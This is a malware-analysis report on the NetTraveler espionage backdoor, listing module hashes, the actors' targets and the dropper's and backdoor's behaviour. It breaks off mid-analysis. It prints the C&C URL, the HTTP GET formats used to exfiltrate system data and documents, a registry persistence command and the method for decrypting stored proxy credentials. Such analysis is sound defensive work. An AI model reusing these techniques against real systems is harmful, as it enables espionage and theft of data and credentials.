modules:\n\n01d06f85fce63444c3563fe3bd20c004\n\n03e8d330abc77a6a9d635d2e7c0e213a\n\n08e5352a2416bd32a1c07f2d6c2f11fa\n\n13b3cb819b460591c27e133e93fb8661\n\n19a0693480c82f2b7fc8659d8f91717a\n\n\n1a70e1e36e6afa454f6457140ac3d2ec\n\n1dcad7c8f56207b2c423353f0c328755\n\n1f26e5f9b44c28b37b6cd13283838366\n\n209c3b51cad30c85ca79a9f067ce04cd\n\n22be9cca6e4ec3af327595b890a92fec\n\n28e9faec9de3bbdeb65435bfc377d1f8\n\n294da087e6329ae78c1a5fb42b999500\n\n29a394a4ec8a30b5f36c7b874fc9fe10\n\n2a43c23a17cd2bc9074a486c47444e7c\n\n2ac8f77548e87b401767c7076adfa00d\n\n2d0e4748d857c12184ed2c94c13ec1ae\n\n2dc139d82a2a5bf027bcb6a40f75b3f4\n\n33334d8dc36c4ee7739fe2f8b448da72\n\n36f9a0e71f0b580333c61bfeaa88df39\n\n37d588b289c65f10c256e43eba939a0a\n\n382c1d692dd3cec9b046e5c0eeaf92e6\n\n39c2b2ee24373bf1ef20faff958718bc\n\n3b4cf5f1ff8c4187e41c6ab80f000491\n\n3cb96fe79aa01c82ac68c54e88918e57\n\n482f112cb7cb0293d99f8a7606acbe85\n\n4968882f189236952fd38a11586b395a\n\n4c8950da250ea135ee77a2644af414ba\n\n524aed944b7f307eea5677eda7e2079a\n\n54583ccc97c33e358510b563b1536e69\n\n57f2374d9f2a787339b0c6a5b1008a72\n\n5e35b31472a2e603a995198d8e8411ed\n\n5e7c5e8d9f5864488ddf04b662d1ad8e\n\n63f0f91e3ccf5dd00a455d3038a299f4\n\n66684b8b82fb5318a41ab7e6abb8dd42\n\n677f7c42f79a0a58760056529739fdd6\n\n6afeec03c8f4bc78fa2b3ad27392b0e7\n\n6d00e4f95fba02126b32bb74dc4fec55\n\n6d49cdbade7541d46be3fb47a0f563bb\n\n6de813a22b2b73e330085ec7c85e041b\n\n\n-----\n\n71f311a648348e7598eb55ab7618842c\n\n723129912a2d0fb4aede7100071787ef\n\n778c1764dd5c36c1eb96c49a8f8441e6\n\n7b92e9d21bc4db838bc102b289f4fd5f\n\n812d8e4d7a484bb363b139cfa08617e5\n\n81591ae1c975b8a0b5ad5546a103992c\n\n81d92e20f3078bd8e43b226308393e43\n\n83429db9cc63196bf42c691cc09b7b84\n\n852f562812305ad099372109f8e8b189\n\n85865e048183849b255c92e609a5fa25\n\n86cce64193a347b50329a32cdf08d198\n\n89bfd463ca76b62c61a548778316567d\n\n8ccea94fd83d9cb1b15a2a4befec24a2\n\n8d3036a65ac2404d4562cdb927fd3d2c\n\n8d78a9e3df1e19f9520f2bbb5f04cb54\n\n8dc61b737990385473dca9bfc826727b\n\n95113e04af14c23df607964fa9d83476\n\n9b198f1e260700bdcb4740266cd35b3f\n\n9c1c2825532b25e266d62db50952ab44\n\n9c544da8c23826379d60581cce17a483\n\na0e350787e4134ea91ccb26d17cdf167\n\na1169fb2eb93616ced7536a53fb05648\n\na431d5786d9d95bc9d04df07cbefc0a2\n\na6d89df2a80675980fb3e4a9bcc162e2\n\na77456a160890a26a8f7c019c2e77021\n\naa6f8eff83aea3ff7b8f016e67f74dac\n\naf6649323daf6dbd3aef1b950588487c\n\nb3840ec1299517dacd6c18c71ff5bafc\n\nb8c99bc028a0a32288d858df7bf6bec1\n\n\nThe NetTraveler\n\nb990752f8266d7648070bea7e24d326f\n\nba026e6190aee2c64ef62a4e79419bcf\n\nbea6e3481c0a06ce36600d8b3cc6155b\n\nc87e8a3ceefd93c7e431b753801c6bb6\n\ncb9cc50b18a7c91cf4a34c624b90db5d\n\ncebaaad59f1616698dec4f14d76b4c9a\n\nd04a7f30c83290b86cac8d762dcc2df5\n\nd218706eb07f2722ae4e0106cce27d52\n\nd286c4cdf40e2dae5362eff562bccd3a\n\nd2fe88fff648a0bcbfdf0f0bd042a0a4\n\nd354b71116961cad955ed11cb938ca32\n\nd687cfde1c4ea77de1b92ea2f9e90ad5\n\nd80c29813bfbc3cbcbd469249d49ebf3\n\nd9c0ca95e49b113c5751fffdb20beb3f\n\nd9cf41b5d11e42dabf9470964d09c000\n\ndb6e36f962fdb58c8e9f8f9a781fda66\n\ndc01df3c40cb4fb0bef448693475ea1b\n\ndef612ad0554006378f185d3b56efb57\n\ne51a4cc0272a98e9eddfec16667603f4\n\ne5b1ffd2ecd7e610d07d093d65639da9\n\neb5761c410b5139f23235e9b67964495\n\neefc66a1e978dc9d825f28702106d4d5\n\nefa23860086c5d12d3e6b918073c717f\n\nf3c5c20f5c45fc401484caf72753d778\n\nfad8f37c9bd5420f49cfd5960a60fa24\n\nfb3495715764cdaa547f2b040c0a9b1f\n\nfc3853c2383e2fbb2af381fd1277504d\n\nfe16c30782e2b16b07d5a3a1cf9dfb8f\n\nff04126a5d61a10c81bfd0a6d0a643d0\n\n\n-----\n\nconclusions\n\n## Conclusions:\n\nDuring our analysis, we describe NetTraveler, a\n\nmalicious data exfiltration tool used by a me\ndium-sized threat actor group from China. The\n\nmain targets of the group include government\n\ninstitutions, embassies, oil and gas industry,\n\nresearch institutes, universities, private com\npanies, military contractors and activists. The\n\ngroup’s domains of interest include space ex\nploration, nanotechnology, energy production,\n\nnuclear power, lasers, medicine and communi\ncations between others.\n\nAlthough not very advanced, the NetTtraveler\n\nattackers have successfully compromised hun\ndreds of targets around the world, with the high\nest number in Mongolia, India and Russia.\n\nThe group using NetTraveler is also employing\n\nother malware, including Zegost, Saker and oth\ners. To compromise their victims, they rely on\n\nexploits for two popular vulnerabilities in Mic\nrosoft Office.\n\nBased on collected intelligence, we estimate the\n\ngroup size to about 50 individuals, most of which\n\nspeak Chinese natively and has knowledge of\n\nEnglish language.\n\n\nBy publishing this report we would like to raise\n\nawareness of all organizations and individuals\n\nwho might become a victim of these attackers.\n\nWe would like to encourage people of all coun\ntries to learn something from this report, check\n\ntheir systems and be prepared for potential fu\nture cyberattacks against them.\n\nMore information on attribution and victims will\n\nbe available to selected parties, including lo\ncal authorities of victim countries. For details,\n\nplease contact us at intelreports@kaspersky.\n\ncom.\n\n\n-----\n\nThe NetTraveler\n\n## Appendix A:\n Malware technical analysis\n\n### The NetTraveler Dropper\n\n|MD5|2a43c23a17cd2bc9074a486c47444e7c|\n|---|---|\n|Create date (GMT)|2013.02.18 07:54:28|\n|Size|176’640|\n|Linker version|6.0 (MSVC++ 6.0)|\n\n\nDescription\n\nThe module is a Win32 PE executable file com\npiled in Microsoft Visual C++ 6.0. Its main pur\npose is to drop a DLL file and register it as a sys\ntem service. The malware looks up a suitable\n\nservice name from one of the values in the reg\nistry.\n\nThis module also drops an INI-type file with the\n\nconfiguration that is later used by the NetTrav\neler backdoor.\n\n\nTechnical Details\n\nExecution of the module starts with the creation\n\nof a system mutex object called “INSTALL SER\nVICES NOW!”. If this mutex already exists the\n\nmodule quits to avoid duplicate instances of the\n\nsame module from running.\n\nAfter that, the module creates the configura\ntion file named %WINDIR%\\system\\config_t.dat\n\nwhich is populated with the strings embedded in\n\nthe body of the executable and encrypted with\n\nsimple one-byte XOR (0x3E).\n\n\nEncrypted configuration data in the dropper\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nThe config_t.dat is an INI-type file which contains\n\nthe module configuration shown below:\n\n_[Option]_\n\n_WebPage=hXXp://vip222idc.s169.288idc.com/nt12/_\n\n_newyork/city/nettraveler.asp2_\n\n_DownCmdTime=10_\n\n_UploadRate=128_\n\n_[Other]_\n\n_UP=0_\n\n_[OtherTwo]_\n\n_AutoCheck=1_\n\nThe WebPage parameter’s maximum length is\n\n128 bytes and represents a URL for the Com\nmand and Control server (C&C). DownCmdTime\n\nis the delay in minutes between requests sent\n\nto the C&C server.\n\nThe code of the function to dump the INI file\n\nis designed to process several cases. There is\n\n1 byte value for variable UP (which stands for\n\n“Use Proxy”) from section [Other]. If that value\n\nis set to 1 (absolute file offset 0x334) then the\n\nINI file section [Other] will be populated with the\n\nfollowing values:\n\n_[Other]_\n\n_UP=1_\n\n_PS=<string (max 32 bytes from offset 0x335)>_\n\n_PP=<integer (2 bytes and positive from offset 0x355)>_\n\n_PU=<string (max 32 bytes from offset 0x357)>_\n\n_PW=<string (max 32 bytes from offset 0x377)>_\n\n_PF=<integer (2 bytes and non-negative from offset_\n\n_0x397)>_\n\n\nThe purpose of PS, PP, PU, PW, PF parameters\n\nis the following:\n\n>> PS = proxy server address\n\n>> PP = proxy server port\n\n>> PU = proxy username\n\n>> PW = proxy password\n\n>> PF parameter purpose remains unclear.\n\nThe module then queries registry value at\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\n\nNT\\\\CurrentVersion\\Svchost\\netsvcs which\n\nis a multi-string type of value. Then it iterates\n\nthrough the names of services in that value to\n\nfind a special service name. It must not be the\n\n“6to4” service and there must not be registry\n\nkey HKLM\\SYSTEM\\CurrentControlSet\\Ser\nvices\\<servicename>.\n\nOn Windows XP services that match the de\nscribed criterias are (eg.) “Ias”,”Iprip”, “Irmon”\n\nand a few others. These names are different on\n\nother Windows OS and even depend on installed\n\nfeatures or Service Packs. The malware takes\n\nthe first matching service name and uses it.\n\nRight after that, the malware attempts to delete\n\n%WINDIR%\\system32\\<servicename>ex.\n\ndll and registers a new system service with the\n\nsame name <servicename>. The service is\n\ndesigned to be a Win32 shared process like\n\nsvchost, autostarted by system service control\n\nmanager during system boot. That creates cor\nresponding system registry values in HKLM\\\n\nSYSTEM\\CurrentControlSet\\Services\\<ser\nvicename>.\n\n\n-----\n\nAfter that it saves to local directory and executes\n\nthe following batch file (net.bat):\n\n@echo off\n\n@reg add “HKEY_LOCAL_MACHINE\\SYS\nTEM\\CurrentControlSet\\Services\\Irmon\\\n\nParameters” /v ServiceDll /t REG_EXPAND_\n\nSZ /d C:\\WINDOWS\\system32\\<servicen\name>ex.dll\n\nNote that <servicename> is replaced with the\n\nactual system service name that was previously\n\nfound.\n\nAfter that the module creates the C:\\WIN\nDOWS\\system32\\<servicename>ex.dll file\n\non disk and sets hard-coded file creation and\n\nlast access date and time to “20:00 17 August\n\n2004”.\n\nThe new file is then filled with data produced\n\nafter decryption of the hard-coded data block.\n\n### NetTraveler Backdoor (dropped file)\n\n\nThe NetTraveler\n\nDescription\n\nThe malware is Win32 PE DLL file compiled in Mi\ncrosoft Visual C++ 6.0. It has one export function\n\nServiceMain which has the main functionality of\n\nthe module.\n\nThis module has initial filename assigned during\n\ncompilation: “DLL.dll”.\n\nTechnical Details\n\nUpon start the module sets corresponding ser\nvice status to “Start_Pending” and then imme\ndiately to “Running”.\n\nIt checks if system mutex named “NetTravler Is\n\nRunning!” exists and terminates if that is true.\n\nNote: Other known mutexes used by variants of\n\nNetTraveler include:\n\n>> Boat-12 Is Running!\n\n>> DocHunter2012 Is Running!\n\n>> Hunter-2012 Is Running!\n\n>> NT-2012 Is Running!\n\n>> NetTravler Is Running!\n\n>> NetTravler2012 Is Running!\n\n>> SH-2011 Is Running!\n\n>> ShengHai Is Running!\n\nAfter that it opens %WINDIR%\\system\\con\nfig_t.dat file and parses the following values:\n\n|MD5|3c0ea91ea42f2bf6686e 9735998e406e|\n|---|---|\n|Create date (GMT)|2013.02.18 02:33:49|\n|Size|204’800|\n|Linker version|6.0 (MSVC++ 6.0)|\n\n\n-----\n\nAppendix A: Malware technical analysis\n\n_Option]_\n\n_WebPage_\n\n_DownCmdTime_\n\n_UploadRate_\n\n_[OtherTwo]_\n\n_AutoCheck_\n\n_CheckedSuccess_\n\nIt creates a list of local paths in memory to work\n\nwith later:\n\n>> %SYSDIR%\\stat_t.ini\n\n>> %SYSDIR%\\dnlist.ini\n\n>> %SYSDIR%\\enumfs.ini\n\n>> %SYSDIR%\\uenumfs.ini\n\n>> %SYSDIR%\\udidx.ini\n\n>> %TEMP%\\ntvba00.tmp\\\n\nIf CheckedSuccess value from INI file equals 0 or\n\ndoesn’t exist, the module will fetch additional con\nfiguration from the same INI file [Other] section:\n\n\n>> PS (string with no default value, max 64\n\nchars)\n\n>> PP (integer with default value: 80)\n\n>> PU (string with no default value, max 32\n\nchars)\n\n>> PW (string with no default value, max 32\n\nchars)\n\n>> PF (integer with default value: 10)\n\nNext the module prepares some strings for test\ning the Internet connection:\n\n<modulename>.log\n\nhttp://www.microsoft.com/info/privacy_se\ncurity.htm (%TestURL%)\n\nIronically, the %TestURL% is a Microsoft web\n\npage about privacy, security and safety online\n\n(last updated in January 2000):\n\n\n-----\n\nAfter that with the help of WinInet API the mod\nule issues an HTTP GET request to %TestURL%\n\n(see above) and the following hardcoded HTTP\n\nheader values:\n\nAccept: image/gif, image/x-xbitmap, image/\n\njpeg, image/pjpeg, application/x-shock\nwave-flash, */*\n\nAccept-Language: en-us\n\nProxy-Connection: Keep-Alive\n\nPragma: no-cache\n\nUser-Agent: Mozilla/4.0 (compatible; MSIE\n\n6.0)\n\nIt sets other options such as proxy server ad\ndress and port (PS and PP values from INI file\n\nor attempts to find proxy settings automatical\nly), proxy username and password (PU and PW\n\nvalues from the INI file), several connection\n\ntimeouts limited with 60 seconds.\n\nThe module submits the request and reads the\n\nresponse of the server. The response is stored\n\nin newly allocated memory block.\n\nAfter that the malware appends debug output\n\nto the log file named <modulename>.log. The\n\noutput messages are shown below:\n\n_method currect:_\n\n_User: <current user name>_\n\n_ProxyIP::_\n\n_ProxyBypass::_\n\n\nThe NetTraveler\n\n_User: <proxy username>_\n\n_Pass: <proxy password>_\n\n_<data from the URL>_\n\n_///////////////////////////////////////////////_\n\nIf the PS, PP, PU, PW parameters were not found\n\nthe INI file or Autocheck value is set to 1, the\n\nmodule attempts to find local proxy settings ac\ncording to the procedure below.\n\n### Finding Proxy Configuration\n\nFirst, the module lists contents of %PROGRAM\nFILES% directory and appends the listing to the\n\nlog file.\n\nThen it opens IE history file of the current user\n\n(History.IE5\\index.dat) parses it and appends\n\nthe log with discovered logins/password saved\n\nin the the history file as a part of visited URLs.\n\nAfter that the module logs current version of\n\nInternet Explorer. Interestingly that the log file is\n\nappended with the following hard coded string:\n\n“IE版本: Internet Explorer “, 版本 means “ver\nsion” in Simplified Chinese.\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nThe module reads IE version from HKLM\\Soft\nware\\Microsoft\\Internet Explorer\\Version reg\nistry value.\n\nThen it gets version of current OS, and again\n\nappends the result to the log file with some hard\n\ncoded strings in it:\n\n“操作系统版本” which means “version of oper\nating system” in Simplified Chinese.\n\nThe malware is capable of interpretation of sys\ntem minor/major code and recognizing the fol\nlowing O Ses:\n\n>> Microsoft Windows 95\n\n>> Microsoft Windows 95 OSR\n\n>> Microsoft Windows 98\n\n>> Microsoft Windows 98 SE\n\n>> Microsoft Windows Millennium Edition\n\n>> Microsoft Windows NT\n\n>> Microsoft Windows 2000\n\n>> Microsoft Windows XP\n\n>> Microsoft Windows 2003\n\n>> Microsoft Windows Vista\n\n>> Microsoft Windows 7\n\nIt can also recognize type of OS: Professional,\n\nServer, Advanced Server and exact version and\n\nbuild numbers are also appended to the log file.\n\nThere were four different methods to find proxy\n\nconfiguration on the system according to the log\n\nfile messages set in three functions. One of the\n\n\nfunction (method 2) was probably merged with\n\nanother one (method 3) in newer variant of the\n\nmalware.\n\nMethod 1:\n\nThis is a straightforward attempt to connect to\n\nthe test url, assuming that system-wide proxy\n\nsettings are correct or no proxy is required to\n\naccess the external website. The URL for testing\n\nis http://www.microsoft.com/info/privacy_\n\nsecurity.htm with the following header values:\n\nAccept: image/gif, image/x-xbitmap, image/\n\njpeg, image/pjpeg, application/x-shock\nwave-flash, */*\n\nAccept-Language: en-us\n\nProxy-Connection: Keep-Alive\n\nPragma: no-cache\n\nIf the method succeeds the module appends\n\nreceived data from the URL to the log file and\n\ncorresponding parameter is set in the INI file\n\n(UP=0).\n\nIf something fails the following message is ap\npended to the log file: “Method1 Fail!!!!!”\n\nMethod 2 and Method 3:\n\nThis method is used when the infected machine\n\nuses proxy server but the settings are not avail\nable for local SYSTEM user. A user working at\n\n\n-----\n\nthe infected machine might have internet ac\ncess and should have the required proxy server\n\nsettings.\n\nThe malware list all processes running on the\n\nmachine and locates process named “EXPLOR\nER.EXE”. This process is a system shell which is\n\nnormally running after local user successfully\n\nauthenticates and logs in to the system. The\n\nmalware finds explorer process and obtains se\ncurity token which is later used to temporarily\n\nimpersonate as local user and get proxy con\nfiguration with InternetQueryOptionA(0,INTER\nNET_OPTION_PROXY,...) API call.\n\nIf the result contains proxy settings the malware\n\ngets them. If for some reason local proxy set\ntings were not found in current user profile, the\n\nmalware attempts to double-check and opens\n\nIE settings in the registry. The following registry\n\nvalues are checked:\n\nHKCU\\Software\\Microsoft\\Windows\\Cur\nrentVersion\\Internet Settings\\ProxyEnable\n\nHKCU\\Software\\Microsoft\\Windows\\Cur\nrentVersion\\Internet Settings\\ProxyServer\n\nHKCU\\Software\\Microsoft\\Windows\\Cur\nrentVersion\\Internet Settings\\ProxyOver\nride\n\nAfter that the malware first obtains the IE stored\n\ncredentials. It iterates through all stored local\n\n\nThe NetTraveler\n\nuser secrets via CredEnumerateA and looks for\n\nthose which start with “Microsoft_WinInet_” and\n\ncontain the address of the proxy server previ\nously obtained. These secrets are decrypted\n\nwith CryptUnprotectData API call. Such call is\n\npossible only after impersonation as local user\n\nwhich is available for the malware running with\n\nlocal system privileges. This method checks the\n\nfirst available password in the list of passwords\n\nfrom the system stored secrets.\n\nOnce the potential server, port, login and pass\nword are obtained the malware makes a test\n\nquery to the same URL: http://www.microsoft.\n\ncom/info/privacy_security.htm. If it succeeds\n\nthe content of this page is appended to the log\n\nfile with all details about the proxy server. If the\n\nmethod fails it prints the following line in the log\n\nfile: “Method3 Fail!!!!!”\n\nMethod 4:\n\nThis method is identical to Method 3 with just\n\none difference: it checks the last available pass\nword in the list of passwords from the system\n\nstored secrets.\n\nMethod X (debug):\n\nThere is also an unused method in the code with\n\nno internal number, which was most likely used\n\nto debug the application as it writes all interme\ndiate results to the log file, starting from string\n\n\n-----\n\nAppendix A: Malware technical analysis\n\n“Get From IEOption!” or “Get From Reg!” de\npending on the path of code execution.\n\nIf the malware failed to locate the proxy server it\n\nunregisters current malicious service by deleting\n\ncorresponding registry keys in HKLM\\System\\\n\nCurrentControlSet\\<servicename>\\ and at\ntempts to delete all related files from the fol\nlowing list:\n\n>> C:\\Windows\\System32\\enumfs.ini\n\n>> C:\\Windows\\System32\\uenumfs.ini\n\n>> C:\\Windows\\System32\\udidx.ini\n\n>> C:\\Windows\\System32\\dnlist.ini\n\n>> C:\\Windows\\System32\\stat_t.ini\n\nOtherwise, if the proxy was checked successful\nly the malware writes the following value to the\n\nconfig file (config_t.dat):\n\n_[OtherTwo]_\n\n_CheckedSuccess=1_\n\nAfter that the module sleeps for 60 seconds and\n\nstarts a new thread (see below Thread1), sleeps\n\n10 more seconds and creates another thread\n\n(see below Thread2). Right after that it enters an\n\ninfinite loop of doing nothing but sleeping which\n\ncan be interrupted by a special value in global\n\nvariable set by other threads. Upon detecting\n\nthis value the service routine ends which termi\nnates the service execution.\n\n\nThread1 (Command and Control\n\nThread)\n\nThis thread starts from collecting local system\n\ninformation, including the following:\n\n>> Local computer name\n\n>> Local IP address\n\n>> Local user name\n\n>> OS version, build and product type\n\n>> List of local disk drives with available\n\nspace on them\n\n>> CPU characteristics including vendor\n\nidentifier and frequency\n\n>> RAM status\n\n>> Current process lists\n\n>> Output of the “ipconfig /all” system\n\ncommand\n\nThis information is stored in a text buffer with\n\nChinese comments like shown below (transla\ntion is added in red):\n\n[计算机信息] Computer Information\n\n计算机: <Local Hostname> Computer\n\n用户名: <Local Username> User name\n\nIp地址: <Local IP> Address\n\n操作系统: <OS> <Service Pack> (<Build Num\nber>) Operating System\n\n磁盘空间: 总磁盘空间为:***GB,剩余磁盘空间\n\n为***GB(占**.**%)\n\nDisk Space: Total disk space ***GB, the remain\ning disk space ***GB (**.**%)\n\nCPU: <CPU Type> <CPU Frequency>MHZ\n\n物理内存: 总物理内存:***MB,可用内存:***MB (\n\n占**.**%)\n\n\n-----\n\nPhysical Memory: Total physical memory: ***MB\n\nof available memory: ***MB (**.**%)\n\n[进程列表] Process List\n\n0 [System Process]\n\n4 System\n\n892 smss.exe\n\n948 csrss.exe\n\n972 winlogon.exe\n\n1016 services.exe\n\n1028 lsass.exe\n\n…\n\nC&C Communication\n\nThis information is saved in %WINDIR%\\Sys\n\ntem32\\system_t.dll text file. This file is read\n\na moment later, compressed using a custom\n\nLempel-Ziv-based algorithm, encoded with a\n\nmodified Base64 encoding and uploaded to the\n\nC&C server using HTTP GET request of the fol\nlowing format:\n\n_GET /nt12/newyork/city/nettraveler.asp?host_\n\n_id=<DriveCSerialNumber>&hostname=<Host_\n\n_name>&hostip=<Host IP>&filename=travlerback_\n\n_info-<Current date and time>.dll&filestart=0&file_\n\n_text=begin::<modified Base64 and LZ-compressed_\n\n_data>::end_\n\n_Accept: image/gif, image/x-xbitmap, image/jpeg,_\n\n_image/pjpeg, application/x-shockwave-flash, */*_\n\n_Accept-Language: en-us_\n\n_Pragma: no-cache_\n\n_User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win_\n\n_dows NT 5.0)_\n\n\nThe NetTraveler\n\n_Host: vip222idc.s169.288idc.com_\n\n_Connection: Keep-Alive_\n\nIf the file upload is successful, the module de\nletes the “system_t.dll” file. Please note that\n\nthe serial number of current disk drive (most\n\nlikely it is drive “C”) is used in HTTP query value\n\nhostid. This identifier derived from the local\n\nfilesystem is used later as a reliable identifier of\n\ncurrent infected machine or simply BotId.\n\nThe Control Loop\n\nAfter that it enters control loop. Every 10 minutes\n\naccording to the DownCmdTime parameter val\nue in the config file, it sends HTTP GET request\n\nof the following format:\n\n_GET /nt12/newyork/city/nettraveler.asp?ac_\n\n_tion=getcmd&hostid=<DriveCSerialNumber>&host_\n\n_name=<Hostname>_\n\n…\n\nIf the server response starts with “[CmdBegin]”\n\nand ends with “[CmdEnd]” then the response\n\nis saved in C:\\Windows\\System32\\stat_t.\n\nini file. After that the code confirms receiving\n\nthe command by submitting another HTTP GET\n\nrequest in the format below:\n\n_GET /nt12/newyork/city/nettraveler.asp?action=_\n\n_gotcmd&hostid=<DriveCSerialNumber>&hostname_\n\n_=<Hostname>_\n\n…\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nThe module expects server to reply “Success”. If\n\nit doesn’t the module will try again in 10 minutes.\n\nIf the server was notified and confirmed receiv\ning the notification, the module reads stat_t.\n\nini file which is just another config in INI format:\n\n_[Download]_\n\n_dircount=<integer, default 0>_\n\n_filecount=<integer, default 0>_\n\n_f1=<string>_\n\n_f2=<string>_\n\n_f3=<string>_\n\n_…_\n\n_d1=<string>_\n\n_d2=<string>_\n\n_d3=<string>_\n\n_…_\n\n_[Scan]_\n\n_dircount=<integer, default 0>_\n\n_filecount=<integer, default 0>_\n\n\n_All values f<number> from stat_t.ini file are read and_\n\n_saved in %WINDIR%\\System32\\dnlist.ini file:_\n\n_[Filelist]_\n\n_f1=<string>_\n\n_f2=<string>_\n\n_f3=<string>_\n\n_…_\n\nAll values d<number> from stat_t.ini file are read\n\nand the corresponding local directory and sub\ndirectories listings are collected and appended\n\nto the dnlist.ini file in the format:\n\n_[Filelist]_\n\n_f1=<string>_\n\n_f2=<string>_\n\n_f3=<string>_\n\n_…_\n\nThe following values from stat_t.ini file are also\n\ntransferred to the dnlist.ini file:\n\n|Section in stat_t.ini|Value in stat_t.ini|Default|Section in dnlist.ini|Value in dnlist.ini|\n|---|---|---|---|---|\n|[Scan]|dircount||[ScanList]|dircount|\n|[Scan]|ScanAll|False|[ScanList]|ScanAll|\n|[Other]|TypeLimit|True|[Other]|TypeLimit|\n|[Other]|USearch|True|[Other]|USearch|\n|[Other]|GSearch|True|[Other]|GSearch|\n|[Other]|UTypeLimit|True|[Other]|UTypeLimit|\n|[Other]|UAuto|False|[Other]|UAuto|\n|[Other]|Types|doc, docx, xls, xlsx, txt, rtf, pdf|[Other]|Types|\n\n\n-----\n\n|[Other]|UP|False|[Other]|0 or 1|\n|---|---|---|---|---|\n|[Other]|PS||[Other]|PS|\n|[Other]|PP|80|[Other]|PP|\n|[Other]|PU||[Other]|PU|\n|[Other]|PW||[Other]|PW|\n|[Other]|PF|10|[Other]|PF|\n\n\nThis is clearly the functionality which lets the\n\nattacker download specific files or even full di\nrectories including all subdirectories contents\n\nbasing on defined file search criterias, such as\n\nfile extensions.\n\nFilesystem Scan\n\nThe malware has a file enumeration routine,\n\nwhich gets the settings from dnlist.ini (such as\n\ndirectory paths to process) and launches a re\ncursive directory search. The output is saved to\n\nenumfs.ini file in the following format:\n\n_[Computer]_\n\n_Name=<Local system name>_\n\n_Page=<Current Windows ANSI code page (ACP)>_\n\n_[<Local system name>]_\n\n_d1=<string>_\n\n_d2=<string>_\n\n_…_\n\n_d<N>=<string>_\n\n_dircount=<N>_\n\n_[<d1 string>]_\n\n_f1=<string>_\n\n_f2=<string>_\n\n_…_\n\n\nThe NetTraveler\n\n[Other] 0 or 1\n\n[Other] PS\n\n[Other] PP\n\n[Other] PU\n\n[Other] PW\n\n[Other] PF\n\n_f<M>=<string>_\n\n_d1=<string>_\n\n_d2=<string>_\n\n_…_\n\n_d<K>=<string>_\n\n_dircount=<K>_\n\n_filecount=<M>_\n\n_[<d2 string>]_\n\n…\n\nAfter execution, this log file contains directories\n\nwith all filenames and subdirectories. Only di\nrectory/file names are stored, with no addition\nal data such as timestamps or size. When the\n\nsearch is finished, the module saves current\n\ndate to the dnlist.ini file and changes option\n\nScanAll, see format below. This is done to avoid\n\nrecurrent scanning of the filesystem, which is\n\nnormally a heavy process and might be noticed\n\nby local user or an administrator.\n\n_[EnumTime]_\n\n_DateTime=<YYYY-MM-DD date>_\n\n_[ScanList]_\n\n_ScanAll=False_\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nAfter scanning the local filesystem, enumfs.\n\nini file is uploaded to the server via HTTP GET\n\nrequest described above (see the submission\n\nprocess of stat_t.ini file in the beginning of C&C\n\nCommunication part) with filename of the fol\nlowing format:\n\nFileList-<Month><Day>-<Hour><Minute>\n\n<Second>.ini\n\nUploading Files\n\nThe next stage of this thread uploads files inter\nesting for the attacker to the C&C server. This\n\nprocess is described below.\n\nThe module works with files described in dnlist.\n\nini file. It gets a list of file extensions that must\n\nbe uploaded to the C&C first. There is a default\n\nlist of extensions (value Types of section [Oth\ner]) that represent interest for the attackers:\n\ndoc,docx,xls,xlsx,txt,rtf,pdf. Then it gets file\ntotal values from [FileList] section of dnlist.ini\n\nand iterates through every f<N> value, where N\n\nis a positive integer starting from 1.\n\nThere are several tests applied to each file, be\nfore it is uploaded to the server, including the\n\nfollowing:\n\n>> File size must not be larger than ~10Mb\n\n(10’485’760 bytes).\n\n - File must have one of the extensions from >\n\nthe “Types” option.\n\n\nIf the file matches the criterias, then a unique\n\nfile state identifier for that file is created,\n\nwhich is an MD5 hash of the following string:\n\n“<Filename> <Year>-<Month>-<Day>\n\n<Hour>:<Minute>:<Second>:<Millisec\nonds>”. The date and time values in the string\n\nbefore are obtained from the file last change\n\ntime.\n\nAfter that the module creates a name used for\n\nuploading the file to the server, which consists\n\nof the following: “<Year>-<Month>-<Day>\n<Hour>-<Minute>-<File state identifier, the\n\nMD5>”. The time and date values are also taken\n\nfrom the file’s last change time. This file is up\nloaded to the C&C using the same procedure as\n\nused before for uploading other files.\n\nAfter that, Thread1 attempts to upload a file called\n\nuenumfs.ini, which is created by the Thread2. The\n\nremote filename is set to the following “UFileL\nist-<Month><Day>-<Hour><Minute><Sec\nond>.ini”.\n\nNext, the thread iterates through %TEMP%\\\n\nntvba00.tmp\\ directory and uploads every file\n\nlocated there. The file names are preserved as\n\nthey are.\n\nControl Procedure\n\nThen, the thread issues a special HTTP GET re\nquest to get next control instruction from the\n\nC&C. This is done by accessing the following URI:\n\n\n-----\n\n_hXXp://vip222idc.s169.288idc.com/nt12/newyork/_\n\n_city/nettraveler.asp?action=getdata (3)_\n\nServer response is converted to uppercase and\n\nanalyzed. There is defined set of responses ex\npected from the C&C server:\n\n01. <BotId>:UNINSTALL\n\nThis command simply uninstalls the malicious\n\nservice from the registry and deletes locally cre\nated files.\n\n02. <BotId>:UPDATE\n\nThis procedure starts from uninstalling current\n\nservice, then it issues three HTTP GET requests\n\nto the C&C script URL:\n\n_GET .../newyork/city/nettraveler.asp?action=data-_\n\n_size to get the size of updated module that will_\n\nbe pushed with next request.\n\n_GET .../newyork/city/../updata.exe to get the up-_\n\ndated module to be executed. This module is\n\ninstantly saved to %WINDIR%\\install.exe and\n\nexecuted.\n\n03. <BotId>:RESET\n\nThis procedure simply removes all temporary\n\nfiles, such as the following:\n\n\nThe NetTraveler\n\n>> %SYSDIR%\\enumfs.ini\n\n>> %SYSDIR%\\dnlist.ini\n\n>> %SYSDIR%\\udidx.ini\n\n>> %SYSDIR%\\uenumfs.ini\n\n>> %SYSDIR%\\stat_t.ini\n\n04. <BotId>:UPLOAD\n\nThis procedure is identical to the UPDATE com\nmand described before with one difference - no\n\nuninstallation of the current module is done, only\n\nnew executable is downloaded and started. This\n\nmethod is probably used to execute additional\n\nindependent malicious executable, unrelated\n\nto the original NetTraveler malware. Or it can\n\nbe used to infect with the NetTraveler backdoor\n\nconfigured for some other C&C server.\n\nAfter processing any of the commands above\n\nthe malware issues the following request to the\n\nserver to confirm command execution:\n\n_GET .../newyork/city/nettraveler.asp?action=updat-_\n\n_ed&hostid=<BotId>_\n\nIf the server hasn’t issued the UNINSTALL com\nmand the thread continues execution starting\n\nfrom the beginning of The Control Loop (see\n\nabove).\n\n\n-----\n\nAppendix A: Malware technical analysis\n\nThread2 (Drive Monitoring Thread)\n\nThis thread creates a hidden window with class\n\nname “NTMainWndClass” and processes 